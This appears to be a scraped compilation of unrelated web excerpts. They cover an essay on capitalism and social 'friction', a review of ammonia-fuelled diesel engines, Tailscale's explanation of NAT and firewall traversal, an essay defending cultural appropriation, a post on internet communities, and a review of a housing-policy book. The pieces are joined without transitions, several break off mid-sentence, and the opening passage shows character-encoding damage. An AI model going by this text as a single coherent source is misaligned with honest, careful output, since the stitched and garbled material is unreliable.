<p>I think the real flaw in capitalism revealed by the 2008 financial crisis was its unbridled, single-minded pursuit of profit and efficiency. And perhaps the real flaw revealed in our lack of readiness for the 2019-20 pandemic was a manifestation of the same thing. Capitalism neednâ€™t be either unbridled or single-minded. It isnâ€™t in other societies with high standards of living, and it hasnâ€™t been at all points in history in the US. So perhaps itâ€™s time to rekindle certain social norms that serve to slow us down. For example, if people thought about their homes less as financial investments and more as places to live, full of the friction of kids, dogs, friends, neighbours and community, there might be less property speculation with an eye toward buying and selling houses merely for profit. If companies felt the friction of being caretakers of their communities, they might look differently at streamlining their operations by eliminating jobs.</p>
<p>Weâ€™d all like a car that gets 100 miles to a gallon. The forces of …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>The diesel engine, also known as the compression ignition (CI) engine, has been a workhorse of the modern energy economy for more than a hundred years.&nbsp;Its role in the coming sustainable energy economy will be determined by its ability to co-evolve with climate-friendly fuels.&nbsp;Two researchers from the National Institute of Advanced Industrial Science and Technology in Japan have now examined the fit between ammonia and the CI engine.&nbsp;</p><p>Pavlos Dimitriou and Rahat Javaid arrive at a two-part conclusion in their paper, “<a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://www.sciencedirect.com/science/article/abs/pii/S0360319920300124" target="_blank">A review of ammonia as a compression ignition engine fuel</a>,” published in January in the <em>International Journal of Hydrogen Energy</em>. Part one is good news: “Ammonia as a compression ignition fuel can be currently seen as a feasible solution.”&nbsp;Part two is a dose of qualifying reality: to manage emissions of N2O, NOx, and unburnt NH3, “aftertreatment systems are mandatory for the adaptation of this technology,” which means that ammonia-fueled CI engines are likely to be feasible “only for marine, power generation and possibly heavy-duty applications where no significant space constraints exist.”</p><p>The paper provides a detailed and readable account of efforts over the last eight decades to develop a viable version of an ammonia-fueled CI engine.&nbsp;The authors state that, “to the best of [their] knowledge, this is the first review approach focusing entirely on ammonia utilisation for compression ignition.”&nbsp;A major challenge confronted by the development efforts derives from ammonia’s “poor combustion characteristics … such as high autoignition temperature, low flame speed, narrow flammability limits and high heat of vaporization.” They continue, “successful ammonia compression ignition operation could only be observed for engine designs that featured extremely high compression ratios from 35:1 to 100:1.”</p><p>To address this challenge, most researchers resorted to the expedient of co-combustion.&nbsp;With the addition of fuels like diesel, biodiesel, and dimethyl ether, “the combustion of ammonia … is a realistic conception, as the secondary fuel, with lower Autoignition temperature, can be used to trigger the combustion of the mixture.”&nbsp;Different researchers have used a variety of fuel ratios under a variety of conditions.&nbsp;Ammonia ratios as high as 95% have been achieved, but numbers in the range of 40 to 80% are more prevalent in the literature. Hydrogen has been used successfully as the complementary fuel.&nbsp;This includes hydrogen derived from on-board ammonia cracking, but the authors of one study determined that “the introduction of pure hydrogen [from an off-board source] seems to be the most promising in terms of emissions reduction and engine performance enhancement.”</p><p>The dual-fuel approach opens the door to CI for ammonia, but another challenge soon arises: when ammonia is burned as a CI fuel, it tends to produce problematic levels of nitrogen oxides and unburned ammonia. To compound the issue, NOx tends to be a product of high combustion temperatures and unburned ammonia of low temperatures – and there is no “sweet spot” temperature where neither species is a problem.&nbsp;</p><p>Contemporary researchers are attacking this problem with two methods.&nbsp;The first is with advanced fuel injection techniques.&nbsp;By injecting fuel at several points during the engine’s compression stroke, with fine control of the fuel increments, it is possible to achieve “simultaneous reduction of N2O and NH3 emissions in ammonia dual-fuel engines.”&nbsp;The second method is exhaust after-treatment.&nbsp;Selective catalytic reduction (SCR) technologies have been found that can reduce both NOx and unburned ammonia to acceptable levels, a result furthered by “the effect of ammonia in NOx reduction as observed in the modern after-treatment systems.”</p><p>The authors’ conclusion that ammonia is unlikely to become a major fuel for passenger cars will not come as a surprise to most members of the ammonia energy community.&nbsp;Ships, of course, are a different story.</p><p>Engine manufacturer MAN Energy Solutions expects to bring its dual-fueled maritime engine to market in 2024. (An <em>Ammonia Energy</em> <a href="https://www.ammoniaenergy.org/articles/man-ammonia-engine-update/">update on the MAN ammonia engine</a> appeared in January.)&nbsp;Success in the maritime realm will certainly encourage development of engines scaled for off-grid and back-up power generation.&nbsp;For other transportation applications, long the near-exclusive province of internal combustion, CI might have its hands full fighting off electrification via battery and fuel cell.</p></div></div></div></div></div>]]>

<p>We covered a lot of ground in our post about <a href="https://tailscale.com/blog/how-tailscale-works/"><em>How Tailscale
Works</em></a>.  However, we glossed over how we can get through NATs
(Network Address Translators) and connect your devices directly to
each other, no matter what’s standing between them. Let’s talk about
that now!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-intro.png">
    
    
</figure>

<p>Let’s start with a simple problem: establishing a peer-to-peer
connection between two machines. In Tailscale’s case, we want to set
up a WireGuard® tunnel, but that doesn’t really matter. The
techniques we use are widely applicable and the work of many people
over decades. For example, <a href="https://webrtc.org/">WebRTC</a> uses this bag of tricks to
send peer-to-peer audio, video and data between web browsers. VoIP
phones and some video games use similar techniques, though not always
successfully.</p>
<p>We’ll be discussing these techniques generically, using Tailscale and
others for examples where appropriate. Let’s say you’re making your
own protocol and that you want NAT traversal. You need two things.</p>
<p>First, the protocol should be based on UDP. You <em>can</em> do NAT traversal
with TCP, but it adds another layer of complexity to an already quite
complex problem, and may even require kernel customizations depending
on how deep you want to go. We’re going to focus on UDP for the rest
of this article.</p>
<p>If you’re reaching for TCP because you want a stream-oriented
connection when the NAT traversal is done, consider using QUIC
instead. It builds on top of UDP, so we can focus on UDP for NAT
traversal and still have a nice stream protocol at the end.</p>
<p>Second, you need direct control over the network socket that’s sending
and receiving network packets. As a rule, you can’t take an existing
network library and make it traverse NATs, because you have to send
and receive extra packets that aren’t part of the “main” protocol
you’re trying to speak. Some protocols tightly integrate the NAT
traversal with the rest (e.g. WebRTC). But if you’re building your
own, it’s helpful to think of NAT traversal as a separate entity that
shares a socket with your main protocol. Both run in parallel, one
enabling the other.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-deep-integration.png">
    
    
</figure>

<p>Direct socket access may be tough depending on your situation. One
workaround is to run a local proxy. Your protocol speaks to this
proxy, and the proxy does both NAT traversal and relaying of your
packets to the peer. This layer of indirection lets you benefit from
NAT traversal without altering your original program.</p>
<p>With prerequisites out of the way, let’s go through NAT traversal from
first principles. Our goal is to get UDP packets flowing
bidirectionally between two devices, so that our other protocol
(WireGuard, QUIC, WebRTC, …) can do something cool. There are two
obstacles to having this Just Work: stateful firewalls and NAT
devices.</p>
<h3 id="figuring-out-firewalls">Figuring out firewalls</h3>
<p>Stateful firewalls are the simpler of our two problems. In fact, most
NAT devices include a stateful firewall, so we need to solve this
subset before we can tackle NATs.</p>
<p>There are many incarnations to consider. Some you might recognize are
the Windows Defender firewall, Ubuntu’s ufw (using iptables/nftables),
BSD’s pf (also used by macOS) and AWS’s Security Groups. They’re all
very configurable, but the most common configuration allows all
“outbound” connections and blocks all “inbound” connections. There
might be a few handpicked exceptions, such as allowing inbound SSH.</p>
<p>But connections and “direction” are a figment of the protocol
designer’s imagination. On the wire, every connection ends up being
bidirectional; it’s all individual packets flying back and forth. How
does the firewall know what’s inbound and what’s outbound?</p>
<p>That’s where the stateful part comes in. Stateful firewalls remember
what packets they’ve seen in the past and can use that knowledge when
deciding what to do with new packets that show up.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-1a.png">
    
    
</figure>

<p>For UDP, the rule is very simple: the firewall allows an inbound UDP
packet if it previously saw a matching outbound packet. For example,
if our laptop firewall sees a UDP packet leaving the laptop from
<code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, it’ll make a note that incoming
packets from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code> are also fine. The
trusted side of the world clearly intended to communicate with
<code>7.7.7.7:5678</code>, so we should let them talk back.</p>
<p>(As an aside, some <em>very</em> relaxed firewalls might allow traffic from
anywhere back to <code>2.2.2.2:1234</code> once <code>2.2.2.2:1234</code> has communicated
with anyone. Such firewalls make our traversal job easier, but are
increasingly rare.)</p>
<h4 id="firewall-face-off">Firewall face-off</h4>
<p>This rule for UDP traffic is only a minor problem for us, as long as
all the firewalls on the path are “facing” the same way. That’s
usually the case when you’re communicating with a server on the
internet. Our only constraint is that the machine that’s <em>behind</em> the
firewall(s) must be the one initiating all connections. Nothing can
talk to it, unless it talks first.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-2.png">
    
    
</figure>

<p>This is fine, but not very interesting: we’ve reinvented client/server
communication, where the server makes itself easily reachable to
clients. In the VPN world, this leads to a hub-and-spoke topology: the
hub has no firewalls blocking access to it and the firewalled spokes
connect to the hub.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-3.png">
    
    
</figure>

<p>The problems start when two of our “clients” want to talk
directly. Now the firewalls are facing each other. According to the
rule we established above, this means both sides must go first, but
also that neither can go first, because the other side has to go
first!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-4.png">
    
    
</figure>

<p>How do we get around this? One way would be to require users to
reconfigure one or both of the firewalls to “open a port” and allow
the other machine’s traffic. This is not very user friendly. It also
doesn’t scale to mesh networks like Tailscale, in which we expect the
peers to be moving around the internet with some regularity. And, of
course, in many cases you don’t have control over the firewalls: you
can’t reconfigure the router in your favorite coffee shop, or at the
airport. (At least, hopefully not!)</p>
<p>We need another option. One that doesn’t involve reconfiguring
firewalls.</p>
<h4 id="finessing-finicky-firewalls">Finessing finicky firewalls</h4>
<p>The trick is to carefully read the rule we established for our
stateful firewalls. For UDP, the rule is: <strong>packets must flow out
before packets can flow back in.</strong></p>
<p>However, nothing says the packets must be <em>related</em> to each other
beyond the IPs and ports lining up correctly. As long as <em>some</em> packet
flowed outwards with the right source and destination, any packet that
<em>looks like</em> a response will be allowed back in, even if the other
side never received your packet!</p>
<p>So, to traverse these multiple stateful firewalls, we need to share
some information to get underway: the peers have to know in advance
the <code>ip:port</code> their counterpart is using. One approach is to
statically configure each peer by hand, but this approach doesn’t
scale very far. To move beyond that, we built a <a href="https://tailscale.com/blog/how-tailscale-works/#the-control-plane-key-exchange-and-coordination">coordination
server</a> to keep the <code>ip:port</code> information synchronized in a
flexible, secure manner.</p>
<p>Then, the peers start sending UDP packets to each other. They must
expect some of these packets to get lost, so they can’t carry any
precious information unless you’re prepared to retransmit them. This
is generally true of UDP, but especially true here. We’re <em>going</em> to
lose some packets in this process.</p>
<p>Our laptop and workstation are now listening on fixed ports, so that
they both know exactly what <code>ip:port</code> to talk to. Let’s take a look at
what happens.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5a.png">
    
    
</figure>

<p>The laptop’s first packet, from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, goes
through the Windows Defender firewall and out to the internet. The
corporate firewall on the other end blocks the packet, since it has no
record of <code>7.7.7.7:5678</code> ever talking to <code>2.2.2.2:1234</code>. However,
Windows Defender now remembers that it should expect and allow
responses from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code>.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5b.png">
    
    
</figure>

<p>Next, the workstation’s first packet from <code>7.7.7.7:5678</code> to
<code>2.2.2.2:1234</code> goes through the corporate firewall and across the
internet. When it arrives at the laptop, Windows Defender thinks “ah,
a response to that outbound request I saw”, and lets the packet
through! Additionally, the corporate firewall now remembers that it
should expect responses from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, and
that those packets are also okay.</p>
<p>Encouraged by the receipt of a packet from the workstation, the laptop
sends another packet back. It goes through the Windows Defender
firewall, through the corporate firewall (because it’s a “response” to
a previously sent packet), and arrives at the workstation.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5c.png">
    
    
</figure>

<p>Success! We’ve established two-way communication through a pair of
firewalls that, at first glance, would have prevented it.</p>
<h4 id="creative-connectivity-caveats">Creative connectivity caveats</h4>
<p>It’s not always so easy. We’re relying on some indirect influence over
third-party systems, which requires careful handling. What do we need
to keep in mind when managing firewall-traversing connections?</p>
<p>Both endpoints must attempt communication at roughly the same time, so
that all the intermediate firewalls open up while both peers are still
around. One approach is to have the peers retry continuously, but this
is wasteful. Wouldn’t it be better if both peers knew to start
establishing a connection at the same time?</p>
<p>This may sound a little recursive: to communicate, first you need to
be able to communicate. However, this preexisting “side channel”
doesn’t need to be very fancy: it can have a few seconds of latency,
and only needs to deliver a few thousand bytes in total, so a tiny VM
can easily be a matchmaker for thousands of machines.</p>
<p>In the distant past, I used XMPP chat messages as the side channel,
with great results. As another example, WebRTC requires you to come up
with your own “signalling channel” (a name that reveals WebRTC’s IP
telephony ancestry), and plug it into the WebRTC APIs. In Tailscale,
our coordination server and fleet of DERP (Detour Encrypted Routing
Protocol) servers act as …</p></div></div>

Some of her followers <a href="https://www.irishtimes.com/culture/tv-radio-web/morgan-bullock-irish-dancing-tiktok-star-people-said-i-m-appropriating-irish-culture-1.4308680">criticized an African-American teenager</a> for displaying her immense talent at Irish dancing on TikTok. A member of a UK knitting circle <a href="https://www.telegraph.co.uk/radio/what-to-listen-to/did-knitting-become-battleground-cancel-culture/">was ostracized</a> for acknowledging that she had drawn creative inspiration from a trip to India. <a href="https://www.change.org/p/trader-joe-s-remove-racist-packaging-from-your-products">A petition</a> was launched to compel the Trader Joe’s grocery chain to stop labeling its vaguely Latin American products as “Trader José’s” and its Chinese-themed products as “Trader Ming’s.”</p><p>For the most part, mainstream institutions have not come to the defense of these embattled&nbsp;innocents. The <em>Los Angeles Times </em><a href="https://www.latimes.com/business/story/2020-08-05/trader-joes-joses-mings-labels-branding-backlash">covered the Trader Joe’s story</a> with strained neutrality, citing one former customer who bemoaned the company’s “failure to reflect on what their goal is in this movement” for racial justice—as if the grocery chain were a student activist who had overslept and missed a demonstration. The <em>New York Times</em> ran <a href="https://www.nytimes.com/2019/03/29/style/modern-love-race-i-broke-up-with-her-because-shes-white.html">a pitiable op-ed</a> by a confused young person who broke up with a romantic partner because of their ethnoracial differences. (What greater appropriation could there be than to take another into your heart?) The BBC <a href="https://www.bbc.co.uk/news/newsbeat-51177738">has solemnly reported</a> about the efforts of haute couture to eliminate such transgressions as cornrows on “white” male models. </p><p>It would be nearly unthinkable for any establishment media outlet today to run an op-ed defending, say, the wearing of dreadlocks by a person of European descent—even though this hairstyle was known as the <em>plica polonica</em> or “Polish plait” and associated with the Tatar horsemen who inhabited the Polish-Lithuanian duchy long before it was associated with the African diaspora. Yet, outside of our current cultural context, such arguments seem moderate and reasonable. </p><p>Cultural appropriation is far too widespread a process to be classified in Manichean terms like <em>good</em> and <em>bad</em>. It is simply a general law of culture: it explains why, for example, horses and guns are to be found in nearly every populated corner of the world, why there are Muslim Indonesians and Christian Inuit, why the Taliban use Toyota pick-up trucks, and why I like Siberian epic poetry.</p><p>I want to focus here on the kind of case that is now most frequently derided as “problematic”: freely adopting aspects of another culture simply because one values them as crystallizations of human excellence. Cultural appropriation, in this narrower sense, is an unqualified good—and to oppose it is nothing less than anti-human. </p><p>The most familiar critique of cultural appropriation is that all cultures are made up of borrowings from one another. In <a href="https://www.theguardian.com/commentisfree/2016/sep/13/lionel-shrivers-full-speech-i-hope-the-concept-of-cultural-appropriation-is-a-passing-fad">a scandalous speech</a> at the 2016 Brisbane Writers’ Festival, novelist Lionel Shriver defied our era’s sensibilities by donning a sombrero and declaring that the work of an author necessarily involves “putting on other people’s hats”—that is, imagining her way into their worlds in a manner that the new prohibitions on cultural appropriation seek to prevent. The well-known boy’s-life guru Jordan Peterson, for his part, <a href="https://www.youtube.com/watch?v=NNUcR-eMxaE">has observed</a> that “there’s no difference between cultural appropriation and learning from each other.” &nbsp;</p><p>These arguments are true enough. Art has no higher purpose than to transcend our limited, provincial subjectivity. And there is no more edifying or noble pursuit than learning from others whose subjectivities differ from our own. But we would do well to rethink our apprehension regarding cultural appropriation for another, more important reason: individual cultures are variations on a fairly limited range of patterns that are grounded in human nature. </p><p>All human beings are the product of the same evolutionary forces. We all have the same brains, and the same mortal bodies, more or less, and we all inhabit the same natural world. A return to an unafraid universalism regarding human nature would require us to pay attention to the ways in which the history of culture as an idea has contributed to our fragmentation. It is no mere coincidence that the word that came to be used for the vital and unique character of particular human communities is the same as the word used to describe the bacteria that give yogurt its strange essence. Early culture theorists like J. G. Herder were motivated by their rejection of the universalist orientation of the Enlightenment, which—in spite of its claim to belong to no particular soil or tradition—seemed to many to speak with a distinctly French accent. Over the course of Herder’s lifetime, significant portions of the German-speaking world, fragmented into a vast number of politically and militarily feeble duchies, principalities and margraviates, came under the occupation of an expansionist French empire. It was only natural to interpret French claims to represent a universalist civilization as politically motivated.</p><p>To oppose this Enlightenment conception of civilization, German intellectuals adopted a metaphor of organic growth. It contrasted the form of life that develops spontaneously in a particular soil to the purportedly universal, or universalizable, condition to which modern man might aspire through force of will, ingenuity, planning and hard work. To that end, Herder exhorted his countrymen to “speak German, O you Germans” and to “spew out ... the ugly slime of the Seine.” Yet, while Herder hated the <em>conceit</em> of universality, which he saw as a pretext for one group of people to impose their form of life on another, he regarded individual human cultures as the distinct local inflections of patterns of behavior that may be found wherever there are human beings—and viewed no culture as either superior to or totally distinct from any other.</p><p>This basic understanding shaped the emergent field of anthropology. For all its complicity with imperialism, the discipline demonstrates that there is a possible third way between the hierarchical measurement of progress implicit in the idea of civilization and the bleak atomism of provincial exceptionalisms. For most early anthropologists, the human species is one, and the variety of its cultures is a flourish upon that underlying unity. To lose sight of this unity is as great a failure as to forget to value cultural specificity. As G. W. Leibniz put it as early as the seventeenth century, both the entire natural world and the human world contained within it are characterized by “unity in variety.”</p><p>Even when we can find no evidence of borrowing between two cultures, or when they are geographically remote from one another, what those cultures are <em>doing</em>—what they are cooking, sewing and singing—is not <em>theirs</em> in any robust sense. Cultural properties are really only a local modulation of species-specific capacities, part of a natural, evolved repertoire of human behavior. </p><p>A version of this naturalistic universalism came to dominate mid-twentieth-century theories of language, thanks in no small measure to Noam Chomsky’s theory of universal grammar. &nbsp;Vladimir Propp identified the thirty-one basic structural elements of folktales, showing that to tell a story is not so much to engage in pure literary invention as to follow the rules of a combinatorial game. Claude Lévi-Strauss pursued this project further by seeking the underlying patterns in Native North American myths, while Alan Lomax studied the folk music of the American South, the Caribbean and Eastern Europe in order to build an invaluable archive of cultural expressions.</p><p>Like many of his contemporaries, Lomax was driven by a desire “to explore and sustain the world’s expressive traditions with humanistic commitment and scientific engagement.” It is just such commitment and engagement—such love of culture and of learning about other cultures—that the campaign against cultural appropriation would, should it prove successful, destroy. </p><p>Many uses of other cultures’ productions truly are morally wrong. Some are even materially and politically harmful. But this is not in virtue of whatever element of appropriation they may involve. Rather, it is usually because someone else’s culture is being used in an exploitative way—and is thus wrong in the same way all forms of exploitation are wrong.</p><p>The opponents of cultural appropriation fail to identify the real sources of exploitation. It is not, for example, the individual “white” American musician who is guilty of exploitation, unable as he is to avoid channeling the Black musical forms in which he has been immersed his whole life. It is the record companies that cynically promote him, even as they deny the same opportunities to equally talented Black artists. </p><p>We can see one egregious example of this misunderstanding in the infernal question of Halloween costumes. It is not enough to problematize cultural appropriation by invoking the common slogan <em>my culture is not a costume</em>. For it is difficult to see what a culture could be other than the sum total of such things as recipes, songs, lines of epic poetry, prayers and, yes, costumes. I myself have memorized significant portions of Sakha epic poetry, and have worn the traditional costumes associated with its recitation—in order to work my way into the culture as best I can, with the encouragement of those born into it. Anyone who insists that a culture is not a costume has never put on the right costume in the right cultural context. What the slogan really should signal is opposition to the decontextualized appearance of serious elements of culture in a setting of charivari and subversion. </p><p>The venerable tradition of Halloween upends our ordinary values and rules of conduct, and, in such a context, the natural presumption is that one’s clothes are chosen specifically to make one look foolish or savage. Combine this carnivalesque element—which has equivalents all over the world—with the cynical incentives of the contemporary commercial behemoth into which Halloween has been swallowed up, and it is not difficult to see why many people frown at the sight of some …</p></div></div>

<p>Internet communities, spaces where people with similar identities and interests interact, are a massive opportunity. General internet spaces are becoming hostile. Societal shifts are forcing more people to rethink the communities they are apart of. Big companies in the space have stagnated. Trends are moving in the right direction. Here are some important ones:</p>



<h3>Lack of Innovation</h3>



<p>To start, communities exist on platforms. The platforms shape how communities interact with each other and develop. Many of the platforms were not build for the internet we have today.</p>



<p>Forums and Reddit are the most obvious ones, and both could be victims to disruption. They have been around forever, and have not changed. Neither is mobile-first. They work, I guess, but they aren’t super attractive. Discord, Slack, and others are creating alternative places for communities to exist online.</p>



<p>Voice and video have a massive role to play in internet communities but have taken a back seat to text until recently. Many people now spend all day on video conferencing for work and have a camera on them at all times. Voice apps are yet to take off but the popularity of podcasts and Airpods show promise.</p>



<p>TikTok showed a different way to create a community. When you focus on video and mobile-first, community looks different. Instead of you choosing your community, TikTok puts you into a community based on what you interact with. I expect to see more of this moving forward.</p>



<h3>Political Tribalism</h3>



<p>People looking for a way out of political tribalism. The fewer communities someone is a part of, the more likely they see a core community as a political group. Politics on the internet is a mind killer but is incentivized by public platforms. There are always other people who feel strongly with you. You don’t have to know much about the subject to gain status. You can “fight” people online. You can pretend you are doing something valuable. Politics is an easy community to be apart of, but people will grow tired of political tribalism. They will look for other options.</p>



<h3>Dark Forest</h3>



<p><a href="https://onezero.medium.com/the-dark-forest-theory-of-the-internet-7dc3e68a7cb1" target="_blank" rel="noreferrer noopener">Yancey Strickler has says the internet has become a dark forest.</a></p>



<blockquote><p>In response to the ads, the tracking, the trolling, the hype, and other predatory behaviors, we’re retreating to our dark forests of the internet, and away from the mainstream.</p></blockquote>



<p>Debate and disagreement cannot be public. It is not acceptable to change your mind. It is not acceptable to have an opposing opinion. Controversial opinions and topics moved out of view.</p>



<p>Ideas don’t cease to exist when they are uncomfortable, they move to places where they are spoken about. They move into the dark forest, hidden communities. Many of these communities already exist on the internet and will only continue to grow. As the size of these dark forest communities grows, so will their impact.</p>



<h3>Internet Education</h3>



<p>Community leads to education. To become a better member (or even a member at all) people must learn things. Ideas, jargon, people, and companies are all examples of information someone might need to learn. Communities often recommend ways of developing the knowledge needed to join. I expect these to expand.</p>



<p>Internet education is cool, but only when high-status members of a community create and deliver it. Many creators added private communities to their offerings. Students learn and interact with the content better within communities than on their own.</p>



<p>Internet communities will be part of the future of education. In-person communities are the only thing Universities do well. If University is over Zoom, are those communities still valuable? The increasing amount of people deferring think not. A large number of people will be looking at other options, and internet communities may provide a path forward.</p>



<h3>Work from Anywhere</h3>



<p>Office small talk that might have fulfilled the social and community aspects of people’s days disappeared. People are social animals, they need interaction and will look for it elsewhere. Internet communities are an obvious place to start. Many companies are realizing they need to create their own internet community to work virtually. It is not clear what good company internet communities look like.</p>



<p>Less commuting also means more time to spend pursuing things other than work. Does this mean more time playing video games and watching Netflix or more time as a member of a community?</p>



<h3>Passion Economy</h3>



<p>Internet communities enable sharing of content and products. If you create something good within a community it will be seen by many of its members. <a href="https://a16z.com/2019/10/08/passion-economy/">Li Jin of a16z says:</a></p>



<blockquote><p>New digital platforms enable people to earn a livelihood in a way that highlights their individuality. These platforms give providers greater ability to build customer relationships, increased support in growing their businesses, and better tools for differentiating themselves from the competition. In the process, they’re fueling a new model of internet-powered entrepreneurship.</p></blockquote>



<p>Lots of people are making a living creating for internet communities. Many more will continue to do this. Being able to understand and appeal to your community is critical to success in this area. As internet communities become more coordinated and understandable, their economic power grows. Lots of people will be competing for a piece in lots of communities.</p>



<hr>



<p>The future of internet communities is bright, and there is still plenty of opportunities to pursue. It is something I will be looking into more.

While I personally like books and papers that use abstract reasoning to make their points, most people don’t, and need stories to understand the world: “Build Build Build” uses Steve Falk’s story to explain why even liberty-shy Californians are sometimes coming around to letting the state change a bit. Most importantly, a baby boomer like him began to see that his own kids’s lives were being constricted by the odious zoning monster that almost all municipalities in California have fed:</p>
<blockquote><p>Mr. Falk began his career on the local control side of that debate. But somewhere along the Deer Hill odyssey, he started to sympathize with his insurrectionist opponents. His son lived in San Francisco and paid a fortune to live with a pile of roommates. His daughter was a dancer in New York, where the housing crunch was just as bad. It was hard to watch his kids struggle with rent and not start to think that maybe Ms. Trauss had a point.</p></blockquote>
<p>New York and San Francisco are strangling their young, and even their middle-aged, in ways that many local politicians aren’t adequately grappling with. <em>Golden Gates</em> expertly surfaces ideas about what is or should be “normal” and whether those things should be normal:</p>
<blockquote><p><img loading="lazy" data-attachment-id="6570" data-permalink="https://jakeseliger.com/2020/08/21/golden-gates-fighting-for-housing-in-america-conor-dougherty/golden_gates/" data-orig-file="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg" data-orig-size="329,499" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="golden_gates" data-image-description="" data-medium-file="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=198" data-large-file="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=329" src="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=198&amp;h=300" alt="" width="198" height="300" srcset="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=198&amp;h=300 198w, https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=99&amp;h=150 99w, https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg 329w" sizes="(max-width: 198px) 100vw, 198px">Patterned on the American mind, in ways we rarely stop to notice, are layers of zoning and land-use rules that say what can be built where. They are so central to how American cities look and operate that they have become a kind of geographic DNA that forms our opinion of what seems proper and right.</p></blockquote>
<p>But what is perceived as normal—what is “patterned”—may not be “proper and right,” even if what’s regarded as “proper and right” gets unfairly mapped to normal. The “layers” of zoning and other rules occur at the neighborhood level, city level, sometimes the county level, and sometimes the state level: each veto point chokes off potential projects and creates a kind of suffocating conformity that has drained cities’s vitality, without many people noticing. Somehow, preventing anyone from doing much of anything almost anywhere is said to increase vitality: instead, we get suffocating rents, millennials who are now themselves reaching into middle age and yet often feel they can’t afford to have kids, because who’s going to pay the rent, let alone the health insurance and the student loans?</p>
<p>We need more freedom and greater liberalization—or at least that’s the framing that I’d choose, using the thinking behind George Lakoff’s work on the language of political ideas. Oddly, though, the most reactionary groups in local housing fights tend to frame themselves as preserving freedom—the freedom from having other people make any changes in their neighborhoods. The result, as Doherty writes, is that “In effect, we shattered urban regions into a constellation of smallish cities and reactionary single-family house neighborhoods whose influence over local land use decisions give them an astounding amount of control over how much shelter we build, where, and at what cost.” The problem goes back decades—”City planners started documenting the urban housing shortage in the 1970s, and in the decades since economists have shown that many of the country’s highest-income regions have become so expensive that they have all but gated out middle-class jobs and people”—but problems that compound enough over time become enormous and menacing.</p>
<p>Housing can’t be both a good investment and an affordable place to live. Preferring one goal intrinsically compromises the other. For the last five decades, we’ve tried to make housing an investment that yields above-market returns: consequently, it’s now incredibly expensive in many productive cities. Perhaps the biggest way we may see changes in this dynamic is through changes in the composition of renters versus owners. <a href="https://www.cnbc.com/2017/01/31/invitation-homes-raises-154-billion-in-ipo-source.html">Invitation Homes</a> is now one of the largest landlords in the country, and it specializes in buying single-family houses (or “oneplexes”) and renting them out. That’s it. The company has realized that the not-in-my-backyard (NIMBY) phenomenon is also a business opportunity. Airbnb exists in part because most cities forbid hoteliers from building sufficient hotel capacity—so renting private housing units is an arbitrage on those rules. <a href="https://www.canvascoliving.com/">Canvas Co-Living</a> is a startup that is working to allow “facilitated shared homes.”</p>
<p><em>Golden Gates’s</em> best story may be that of Sonja Truss, a woman who was tired of the Bay Area’s relentless housing cost increases—so she decided to do something about it:</p>
<blockquote><p>But for a young adult with no obvious signs of intoxication to show up at a midday city meeting to say she was just generally in favor of housing because San Francisco didn’t have enough of it? That made no sense. Nobody attended eight-hour city meetings if they didn’t have to, and while the planning commission was a place of arguments and strange behavior, it was also a place where people at least knew where each other’s lanes were.</p></blockquote>
<p>She decided to scramble the lanes, by arguing that the problem isn’t too much housing but too little. She finds herself in weird ideological waters, because many people who proclaim their progressive bonafides are more conservative, in many ways, than the current occupant of the White House. Labeling one’s opponents is a big deal in Bay Area politics: “Only in San Francisco would a gay man who opposed the death penalty and marched in the local BDSM festival in leather straps have to argue he was truly of the left.” There are lots of racial politics involved too: many of the kinds of people who want to proclaim themselves to be opposed to racism nonetheless support housing and development policies that are racist in practice and effect.</p>
<p>Another chapter discusses <a href="https://factoryos.com/">Factory_OS</a>, a company that’s trying to do modular building. Housing is expensive for many reasons, with zoning at the top of the list—but the actual cost of construction is high, and, in many high-cost metros, the zoning drives up the cost of construction. Why? As zoning artificially restricts housing construction, the construction workers who build new housing have to pay more for existing housing, which means that they have to be paid more by anyone trying to build housing. One gets a kind of perverse ratchet that, again, ends with absurdities like San Francisco. Modular housing, <a href="https://www.vox.com/energy-and-environment/2020/1/15/21058051/climate-change-building-materials-mass-timber-cross-laminated-clt">like cross-laminated timber</a>, promises to reduce the cost of building. Unfortunately, building a housing factory is expensive up front, and the returns are spread across many years—leaving a wide space for bankruptcy. Previous efforts at modular housing have tended to fail when the market turns and the maker goes out of business. Dougherty points out that a recession could doom Factory_OS and its competitors. As of this writing, we’re already likely in the worst recession since 2008, and that was the worst since the Great Depression. What happens with the COVID Recession remains to be seen (the recession is made worse by many laid-off people being stuck with expensive leases and mortgages, due to decades of failure to build enough housing). One of the best ways to be successful in business is to start while a rising economy naturally lifts your company. Many business geniuses are really people with lucky 